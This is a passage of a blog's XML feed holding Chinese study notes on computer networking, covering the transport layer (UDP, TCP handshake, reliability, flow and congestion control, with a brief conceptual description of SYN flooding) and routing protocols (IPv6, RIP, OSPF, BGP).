src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/26.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/27.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>传输层</title>
    <link href="/2022/12/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/"/>
    <url>/2022/12/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h4 id="1-传输层概述"><a href="#1-传输层概述" class="headerlink" title="1.传输层概述"></a>1.传输层概述</h4><p>&emsp;&emsp;为应用层提供通信服务使用网络层的服务</p><ul><li><h6 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h6></li></ul><p>&emsp;&emsp;1、传输层提供进程和进程之间的逻辑通信</p><p>&emsp;&emsp;2、复用和分用</p><p>&emsp;&emsp;3、传输层对收到的报文进行差错检测</p><p>&emsp;&emsp;4、传输层的两种协议</p><ul><li><h6 id="两种协议"><a href="#两种协议" class="headerlink" title="两种协议"></a>两种协议</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/1.png" style="zoom:80%;" /></center><ul><li><h6 id="传输层的寻址与端口"><a href="#传输层的寻址与端口" class="headerlink" title="传输层的寻址与端口"></a>传输层的寻址与端口</h6></li></ul><p>&emsp;&emsp;复用：应用层所有的应用进程都可以通过传输层再传输到网络层</p><p>&emsp;&emsp;分用：传输层从网络层收到数据后交付指明的应用进程</p><p>&emsp;&emsp;逻辑端口/软件端口：端口是传输层的SAP，标识主机中的应用进程</p><p>&emsp;&emsp;端口号只有本地意义，在因特网中不同计算机的相同端口是没有联系的，端口号长度为16bit，能代表65536个不同的端口号</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/2.png" style="zoom:80%;" /></center><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/3.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-UDP协议"><a href="#2-UDP协议" class="headerlink" title="2.UDP协议"></a>2.UDP协议</h4><p>&emsp;&emsp;UDP只在IP数据报服务之上增加了很少功能，即复用分用和差错检测功能</p><ul><li><h5 id="UDP的主要特点"><a href="#UDP的主要特点" class="headerlink" title="UDP的主要特点"></a>UDP的主要特点</h5></li></ul><p>&emsp;&emsp;1、UDP是无连接的，减少开销和发送数据之前的时延</p><p>&emsp;&emsp;2、UDP使用最大努力交付，即不保证可靠交付</p><p>&emsp;&emsp;3、UDP是面向报文的，适合一次性传输少量数据的网络应用</p><p>&emsp;&emsp;4、UDP无拥塞控制，适合很多实时应用</p><p>&emsp;&emsp;5、UDP首部开销小，需要8B，而TCP需要20B</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/4.png" style="zoom:80%;" /></center><ul><li><h6 id="UDP首部格式"><a href="#UDP首部格式" class="headerlink" title="UDP首部格式"></a>UDP首部格式</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/5.png" style="zoom:80%;" /></center><ul><li><h6 id="UDP校验"><a href="#UDP校验" class="headerlink" title="UDP校验"></a>UDP校验</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/6.png" style="zoom:80%;" /></center><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;数据部分需要满足2B的倍数即可</p><p>&emsp;</p><h4 id="3-TCP协议"><a href="#3-TCP协议" class="headerlink" title="3.TCP协议"></a>3.TCP协议</h4><ul><li><h6 id="TCP特点"><a href="#TCP特点" class="headerlink" title="TCP特点"></a>TCP特点</h6></li></ul><p>&emsp;&emsp;1、TCP是面向连接（虚连接）的传输层协议</p><p>&emsp;&emsp;2、每一条TCP连接只能有两个端点，每一条TCP连接只能是点对点的</p><p>&emsp;&emsp;3、TCP提供可靠交付的服务，无差错、不丢失、不重复、按序到达。（可靠有序，不丢不重）</p><p>&emsp;&emsp;4、TCP提供全双工通信：</p><p>&emsp;&emsp;发送缓存——准备发送的数据&amp;已发送但尚未收到确认的数据</p><p>&emsp;&emsp;接收数据——按序到达但尚未被接受应用程序读取的数据&amp;不按序到达的数据</p><p>&emsp;&emsp;5、TCP面向字节流——TCP吧应用程序交下来的数据看成仅仅是一连串的无结构的字节流（流：流入到进程或从进程流出的直接序列）</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/8.png" style="zoom:80%;" /></center><ul><li><h6 id="TCP报文段首部格式（☆）"><a href="#TCP报文段首部格式（☆）" class="headerlink" title="TCP报文段首部格式（☆）"></a>TCP报文段首部格式（☆）</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/9.png" style="zoom:80%;" /></center><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/11.png" style="zoom:80%;" /></center><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;数据部分需要填充至满足4B的倍数即可</p><p>&emsp;</p><h4 id="4-TCP连接管理"><a href="#4-TCP连接管理" class="headerlink" title="4.TCP连接管理"></a>4.TCP连接管理</h4><p>&emsp;&emsp;TCP连接的建立采用客户服务器方式，主动发起连接建立的应用进程叫做客户，而被动等待连接建 立的应用进程叫服务器</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/12.png" style="zoom:80%;" /></center><ul><li><h6 id="TCP的三个阶段"><a href="#TCP的三个阶段" class="headerlink" title="TCP的三个阶段"></a>TCP的三个阶段</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/13.png" style="zoom:80%;" /></center><ul><li><h6 id="TCP的连接建立"><a href="#TCP的连接建立" class="headerlink" title="TCP的连接建立"></a>TCP的连接建立</h6></li></ul><p>&emsp;&emsp;假设运行在一台主机（客户）上的一个进程想与另一台主机（服务器）上的一个进程建立一条连接，客户应用 进程首先通知客户TCP，他想建立一个与服务器上某个进程之间的连接，客户中的TCP会用以下步骤与服务器中 的TCP建立一条TCP连接</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/14.png" style="zoom:80%;" /></center><ul><li><h6 id="SYN洪泛攻击"><a href="#SYN洪泛攻击" class="headerlink" title="SYN洪泛攻击"></a>SYN洪泛攻击</h6></li></ul><p>&emsp;&emsp;SYN洪泛攻击发生在OSI第四层，这种方式利用TCP协议的特性，就是三次握手。攻击者发送 TCP SYN，SYN是TCP三次握手中的第一个数据包，而当服务器返回ACK后，该攻击者就不对 其进行再确认，那这个TCP连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到 再确认的话，还会重复发送ACK给攻击者。</p><p>&emsp;&emsp;这样更加会浪费服务器的资源。攻击者就对服务 器发送非常大量的这种TCP连接，由于每一个都没法完成三次握手，所以在服务器上，这些 TCP连接会因为挂起状态而消耗CPU和内存，最后服务器可能死机，就无法为正常用户提供 服务了。</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/15.png" style="zoom:80%;" /></center><ul><li><h6 id="TCP的连接释放"><a href="#TCP的连接释放" class="headerlink" title="TCP的连接释放"></a>TCP的连接释放</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/16.png" style="zoom:80%;" /></center><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/17.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="5-TCP可靠传输"><a href="#5-TCP可靠传输" class="headerlink" title="5.TCP可靠传输"></a>5.TCP可靠传输</h4><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/18.png" style="zoom:80%;" /></center><ul><li><h6 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/19.png" style="zoom:80%;" /></center><p>&emsp;&emsp;序号保证了报文有序的传输</p><ul><li><h6 id="确认"><a href="#确认" class="headerlink" title="确认"></a>确认</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/20.png" style="zoom:80%;" /></center><ul><li><h6 id="重传"><a href="#重传" class="headerlink" title="重传"></a>重传</h6></li></ul><p>&emsp;&emsp;确认重传不分家，TCP的发送方在规定的时间（重传时间）内没有收到确认就要重传已发送的报文段。（超时重传）</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/21.png" style="zoom:80%;" /></center><ul><li><h6 id="冗余ACK（冗余确认）"><a href="#冗余ACK（冗余确认）" class="headerlink" title="冗余ACK（冗余确认）"></a>冗余ACK（冗余确认）</h6></li></ul><p>&emsp;&emsp;为了在超时事件发生之前就可以知道发送方有没有丢失这种报文段，然后尽快的重传，因此冗余ACK产生</p><p>&emsp;&emsp;每当比期望序号大的失序报文段到达时，发送一个冗余ACK，指明下一个期待字节的序号，例如：</p><p>&emsp;&emsp;发送方已发送1，2，3，4，5报文段</p><p>&emsp;&emsp;接收方收到1，返回给1的确认（确认号为2的第一个字节）</p><p>&emsp;&emsp;接收方收到3，仍返回给1的确认（确认号为2的第一个字节）</p><p>&emsp;&emsp;接收方收到4，仍返回给1的确认（确认号为2的第一个字节）</p><p>&emsp;&emsp;接收方收到5，仍返回给1的确认（确认号为2的第一个字节）</p><p>&emsp;&emsp;发送方收到3个对于报文段1的冗余ACK——&gt; 认为2报文段丢失，重传2号报文段（ 快速重传）</p><p>&emsp;</p><h4 id="6-TCP的流量控制（☆）"><a href="#6-TCP的流量控制（☆）" class="headerlink" title="6.TCP的流量控制（☆）"></a>6.TCP的流量控制（☆）</h4><p>&emsp;&emsp;流量控制：让发送方慢点，要让接收方来得及接收，其中TCP利用滑动窗口机制实现流量控制</p><p>&emsp;&emsp;在通信过程中，接收方根据自己接收缓存的大小，动态地调整发送方的发送窗口大小，即接收窗口rwnd（接收方设置确认报文段的窗口字段来将rwnd通知给发送方），发送方的发送窗口取接收窗口rwnd和拥塞窗口cwnd的最小值</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/22.png" style="zoom:80%;" /></center><ul><li><h6 id="场景模拟"><a href="#场景模拟" class="headerlink" title="场景模拟"></a>场景模拟</h6></li></ul><p>&emsp;&emsp;A向B发送数据，连接建立时，B告诉A：“我的rwnd=400（字节）”，设每一个报文段100B，报文段序号初始值为1</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/23.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-TCP拥塞控制（☆）"><a href="#7-TCP拥塞控制（☆）" class="headerlink" title="7.TCP拥塞控制（☆）"></a>7.TCP拥塞控制（☆）</h4><p>&emsp;&emsp;出现拥塞的条件：对资源需求的总和&gt;可用资源</p><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/24.png" style="zoom:80%;" /></center><ul><li><h6 id="拥塞控制四种算法"><a href="#拥塞控制四种算法" class="headerlink" title="拥塞控制四种算法"></a>拥塞控制四种算法</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/25.png" style="zoom:80%;" /></center><ul><li><h6 id="慢开始和拥塞避免"><a href="#慢开始和拥塞避免" class="headerlink" title="慢开始和拥塞避免"></a>慢开始和拥塞避免</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/26.png" style="zoom:80%;" /></center><ul><li><h6 id="快重传和快恢复"><a href="#快重传和快恢复" class="headerlink" title="快重传和快恢复"></a>快重传和快恢复</h6></li></ul><center><img src="../img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%9D/27.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络层（下）</title>
    <link href="/2022/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/"/>
    <url>/2022/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="网络层（下）"><a href="#网络层（下）" class="headerlink" title="网络层（下）"></a>网络层（下）</h1><h4 id="1-IPv6"><a href="#1-IPv6" class="headerlink" title="1.IPv6"></a>1.IPv6</h4><ul><li><h6 id="IPv6数据报格式"><a href="#IPv6数据报格式" class="headerlink" title="IPv6数据报格式"></a>IPv6数据报格式</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/1.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/2.png" style="zoom:80%;" /></center><ul><li><h6 id="与IPv4的对比"><a href="#与IPv4的对比" class="headerlink" title="与IPv4的对比"></a>与IPv4的对比</h6></li></ul><p>&emsp;&emsp;1、IPv6将地址冲32位（4B）扩大到128位（16B），更大的地址空间（☆）</p><p>&emsp;&emsp;2、IPv6将IPv4的校验和字段彻底移除，以减少每跳的处理时间（☆）</p><p>&emsp;&emsp;3、IPv6将IPv4的可选字段移出首部，变成了扩展首部，成为灵活的首部格式，路由器通常不对扩展首部进行检查， 大大提高了路由器的处理效率（☆）</p><p>&emsp;&emsp;4、IPv6支持即插即用（即自动配置），不需要DHCP协议（☆）</p><p>&emsp;&emsp;5、IPv6首部长度必须是8B的整数倍，IPv4首部是4B的整数倍（☆）</p><p>&emsp;&emsp;6、IPv6只能在主机处分片，IPv4可以在路由器和主机处分片（☆）</p><p>&emsp;&emsp;7、ICMPv6：附加报文类型“分组过大”</p><p>&emsp;&emsp;8、IPv6支持资源的预分配， 支持实时视像等要求，保证一定的带宽和时延的应用</p><p>&emsp;&emsp;9、IPv6取消了协议字段，改成下一个首部字段</p><p>&emsp;&emsp;10、IPv6取消了总长度字段，改用有效载荷长度字段</p><p>&emsp;&emsp;11、IPv6取消了服务类型字段</p><ul><li><h6 id="IPv6地址表示显示"><a href="#IPv6地址表示显示" class="headerlink" title="IPv6地址表示显示"></a>IPv6地址表示显示</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/3.png" style="zoom:80%;" /></center><ul><li><h6 id="IPv6基本地址类型"><a href="#IPv6基本地址类型" class="headerlink" title="IPv6基本地址类型"></a>IPv6基本地址类型</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/4.png" style="zoom:80%;" /></center><ul><li><h6 id="IPv6向IPv4过渡的策略"><a href="#IPv6向IPv4过渡的策略" class="headerlink" title="IPv6向IPv4过渡的策略"></a>IPv6向IPv4过渡的策略</h6></li></ul><p>&emsp;&emsp;双栈协议：</p><p>&emsp;&emsp;双协议栈技术就是指在一台设备上同时启用IPv4协议栈和IPv6协议栈。这样的话，这台设 备既能和IPv4网络通信，又能和IPv6网络通信。如果这台设备是一个路由器，那么这台路 由器的不同接口上，分别配置了IPv4地址和IPv6地址，并很可能分别连接了IPv4网络和IPv6 网络。如果这台设备是一个计算机，那么它将同时拥有IPv4地址和IPv6地址，并具备同时 处理这两个协议地址的功能</p><p>&emsp;&emsp;隧道技术：</p><p>&emsp;&emsp;通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据（或负载） 可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包重新封装然后通过隧道 发送。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/5.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-路由"><a href="#2-路由" class="headerlink" title="2.路由"></a>2.路由</h4><p>&emsp;&emsp;路由器的路由表是又路由算法获得最佳路由，从而形成完整的路由表</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/6.png" style="zoom:80%;" /></center><ul><li><h6 id="路由算法分类"><a href="#路由算法分类" class="headerlink" title="路由算法分类"></a>路由算法分类</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/7.png" style="zoom:80%;" /></center><ul><li><h6 id="分层次的路由选择协议"><a href="#分层次的路由选择协议" class="headerlink" title="分层次的路由选择协议"></a>分层次的路由选择协议</h6></li></ul><p>&emsp;&emsp;（1）因特网规模很大</p><p>&emsp;&emsp;（2）许多单位不想让外界知道自己的路由选择协议，但还是想连入因特网</p><p>&emsp;&emsp;自治系统AS：在单一的技术管理下的一组路由器，而这些路由器使用一种AS内部的路由选择协议和共同的度 量以确定分组在该AS内的路由，同时还使用一种AS之间的路由协议以确定在AS之间的路由。 </p><p>&emsp;&emsp;一个AS内的所有网络都属于一个行政单位来管辖，一个自治系统的所有路由器在本自治系统内都必须连通</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/8.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-RIP协议"><a href="#3-RIP协议" class="headerlink" title="3.RIP协议"></a>3.RIP协议</h4><p>&emsp;&emsp;RIP是一种分布式的基于距离向量的路由选择协议，是因特网的协议标准，最大优点就是简单。</p><p>&emsp;&emsp;RIP协议要求网络中的每一个路由器都维护从它自己到其他每一个目的网络的唯一最佳距离记录（即一组距离）</p><p>&emsp;&emsp;距离：通常为“跳数”，即从源端口到目的端口所经过的路由器个数，经过一个路由器跳数+1。特别的，从一路由器到直接连接的网络距离为1。RIP允许一条路由最多只能包含15个路由器，因此距离为16表示网络不可达</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;1、交换问题，其仅和相邻的路由器交换信息</p><p>&emsp;&emsp;2、信息内容，路由器的交换</p><p>&emsp;&emsp;3、交换间隙，每30秒交换一次路由信息，然后路由器根据新信息更新路由表。若超过180s没收到邻居路由器的通告，则判定 邻居没了，并更新自己路由表</p><p>&emsp;&emsp;路由器刚开始工作时，只知道直接连接的网络的距离（距离为1），接着每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息，经过若干次更新后，所有路由器最终都会知道到达本自治系统任何一个网络的最短距离和下一跳路由器的地址， 即“收敛”</p><ul><li><h6 id="距离向量算法"><a href="#距离向量算法" class="headerlink" title="距离向量算法"></a>距离向量算法</h6></li></ul><p>&emsp;&emsp;1、修改相邻路由器发来的RIP报文中所有的表现</p><p>&emsp;&emsp;对地址为X的相邻路由器发来的RIP报文，修改此报文中的所有项目：把“下一跳”字段中的地址改为X，并把 所有的“距离”字段+1</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;2、对修改后的RIP报文中的每一个项目，进行以下步骤：</p><p>&emsp;&emsp;（1）R1路由表中若没有Net3，则把该项目填入R1路由表</p><p>&emsp;&emsp;（2）R1路由表中若有Net3，则查看下一跳路由器地址：</p><p>&emsp;&emsp;&emsp;&emsp;若下一跳是X，则用收到的项目替换源路由表中的项目</p><p>&emsp;&emsp;&emsp;&emsp;若下一跳不是X， 原来距离比从X走的距离远则更新，否则不作处理</p><p>&emsp;&emsp;3、若180s还没收到相邻路由器X的更新路由表，则把X记为不可达的路由器，即把距离设置为16</p><p>&emsp;&emsp;4、返回</p><ul><li><h6 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/11.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/12.png" style="zoom:80%;" /></center><ul><li><h6 id="RIP协议的报文格式（不要求记忆）"><a href="#RIP协议的报文格式（不要求记忆）" class="headerlink" title="RIP协议的报文格式（不要求记忆）"></a>RIP协议的报文格式（不要求记忆）</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/13.png" style="zoom:80%;" /></center><p>&emsp;&emsp;&emsp;RIP是应用层协议，使用UDP传输（☆）</p><p>&emsp;&emsp;&emsp;一个RIP报文最多可包括25个路由，如超过，必须再用一个RIP报文传送</p><ul><li><h6 id="RIP协议特点"><a href="#RIP协议特点" class="headerlink" title="RIP协议特点"></a>RIP协议特点</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/14.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;R2在收到R1的更新报文之前，还发送原来的报文，因为这时R2并不知道R1出了故障，而R1收到 R2的更新报文后，误认为可经过 R2 到达网R1，于是更新自己的路由表，说：“我到网R1的距离是 3，下一跳经过 R2”。然后将此更 新信息发送给 R2。</p><p>&emsp;&emsp;这样子不断更新下去，直到R1和R2到网1的距离都增大到16时，R1和R2才知道网1是不可达的。</p><p>&emsp;&emsp;</p><h4 id="4-OSPF协议"><a href="#4-OSPF协议" class="headerlink" title="4.OSPF协议"></a>4.OSPF协议</h4><p>&emsp;&emsp;开放最短路径优先OSPF协议：“开放”标明OSPF不是受某一厂商控制，二十公开发表的：“最短路径优先”是因为使用了Dijkstra提出的最短路径算法</p><p>&emsp;&emsp;OSPF最重要的特征就是使用分布式是链路状态协议</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/16.png" style="zoom:80%;" /></center><ul><li><h6 id="链路状态路由算法"><a href="#链路状态路由算法" class="headerlink" title="链路状态路由算法"></a>链路状态路由算法</h6></li></ul><p>&emsp;&emsp;1、每个路由器发现它的邻居结点【HELLO问候分组】，并了解邻居节点的网络地址</p><p>&emsp;&emsp;2、设置到它的每个邻居的成本度量metric（记住这个英文单词）</p><p>&emsp;&emsp;3、构造【DD数据库描述分组】，向邻站给出自己的链路状态数据库中的所有链路状态项目的摘要信息</p><p>&emsp;&emsp;4、如果DD分组中的摘要自己都有，则邻站不做处理；如果有没有的或者是更新的，则发送【LSR链路状态请求分组】 请求自己没有的和比自己更新的信息</p><p>&emsp;&emsp;5、收到邻站的LSR分组后，发送【LSU链路状态更新分组】进行更新</p><p>&emsp;&emsp;6、更新完毕后，邻站返回一个【LSAck链路状态确认分组】进行确认</p><p>如果有一个路由器的链路状态发生变化：</p><p>&emsp;&emsp;5、泛洪发送【LSU链路状态更新分组】进行更新</p><p>&emsp;&emsp;6、更新完毕后，其他站返回一个【LSAck链路状态确认分组】进行确认</p><p>&emsp;&emsp;7、使用Dijkstra根据自己的链路状态数据库构造到其他节点间的最短路径</p><ul><li><h6 id="OSPF的区域"><a href="#OSPF的区域" class="headerlink" title="OSPF的区域"></a>OSPF的区域</h6></li></ul><p>&emsp;&emsp;为了使 OSPF能够用于规模很大的网络，OSPF    将一个自治系统再划分为若干个更小的范围，叫做区域。 每一个区域都有一个 32    位的区域标识符（用点分十进制表示）。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/17.png" style="zoom:80%;" /></center><ul><li><h6 id="OSPF分组"><a href="#OSPF分组" class="headerlink" title="OSPF分组"></a>OSPF分组</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/18.png" style="zoom:80%;" /></center><p>&emsp;&emsp;按考纲记载，为网络层协议</p><ul><li><h6 id="OSPF协议特点"><a href="#OSPF协议特点" class="headerlink" title="OSPF协议特点"></a>OSPF协议特点</h6></li></ul><p>&emsp;&emsp;1、每隔30min，要刷新一次数据库中的链路状态</p><p>&emsp;&emsp;2、由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因 此当互联网规模很大时，OSPF协议要比距离向量协议 RIP好得多</p><p>&emsp;&emsp;3、OSPF不存在坏消息传的慢的问题，它的收敛速度很快</p><p>&emsp;&emsp;</p><h4 id="5-BGP协议"><a href="#5-BGP协议" class="headerlink" title="5.BGP协议"></a>5.BGP协议</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/19.png" style="zoom:80%;" /></center><ul><li><h6 id="BGP协议交换信息的过程"><a href="#BGP协议交换信息的过程" class="headerlink" title="BGP协议交换信息的过程"></a>BGP协议交换信息的过程</h6></li></ul><p>&emsp;&emsp;（需要了解交换的信息是路径的向量即可）</p><p>&emsp;&emsp;BGP所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 AS。当 BGP发言人互相交换了网络可达 性的信息后，各 BGP    发言人就根据所采用的策略从收到的路由信息中找出到达各 AS的较好路由（由于互联网规模比较大，所以，保证较好即可）</p><p>&emsp;&emsp;BGP发言人交换路径向量：</p><p>&emsp;&emsp;自治系统 AS2 的 BGP    发言人通知主干网 AS1的BGP发言人：“要到达网络 N1、 N2、N3和N4可经过 AS2</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/20.png" style="zoom:80%;" /></center><p>&emsp;&emsp;BGP发言人交换路径向量：</p><p>&emsp;&emsp;主干网还可发出通知：“要到达网络 N5、N6和 N7可沿路径（AS1,    AS3）</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/21.png" style="zoom:80%;" /></center><ul><li><h6 id="BGP协议报文格式"><a href="#BGP协议报文格式" class="headerlink" title="BGP协议报文格式"></a>BGP协议报文格式</h6></li></ul><p>&emsp;&emsp;一个 BGP    发言人与其他自治系统中的 BGP    发言人要交换路由信息，就要先建立 TCP    连接，即通过TCP传送，然后 在此连接上交换 BGP    报文以建立 BGP会话(session)，利用 BGP会话交换路由信息</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/22.png" style="zoom:80%;" /></center><ul><li><h6 id="BGP协议的特点"><a href="#BGP协议的特点" class="headerlink" title="BGP协议的特点"></a>BGP协议的特点</h6></li></ul><p>&emsp;&emsp;BGP支持 CIDR，因此 BGP的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的 各个自治系统序列</p><p>&emsp;&emsp;在 BGP刚刚运行时，BGP的邻站是交换整个的 BGP路由表。但以后只需要在发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处</p><ul><li><h6 id="BGP-4的四种报文"><a href="#BGP-4的四种报文" class="headerlink" title="BGP-4的四种报文"></a>BGP-4的四种报文</h6></li></ul><p>&emsp;&emsp;OPEN（打开）报文：用来与相邻的另一个BGP发言人建立关系，并认证发送方</p><p>&emsp;&emsp;UPDATE（更新）报文：通告新路径或撤销原路径</p><p>&emsp;&emsp;KEEPALIVE（保活）报文：在无UPDATE时，周期性证实邻站的连通性；也作为OPEN的确认</p><p>&emsp;&emsp;NOTIFICATION（通知）报文：报告先前报文的差错；也被用于关闭连接</p><p>&emsp;</p><h4 id="6-三种路由协议比较"><a href="#6-三种路由协议比较" class="headerlink" title="6.三种路由协议比较"></a>6.三种路由协议比较</h4><p>&emsp;&emsp;RIP是一种分布式的基于距离向量的内部网关路由选择协议，通过广播UDP报文来交换路由信息</p><p>&emsp;&emsp;OSPF是一个内部网关协议，要交换的信息量较大，应使报文的长度尽量短，所以不使用传输层协议（如UDP 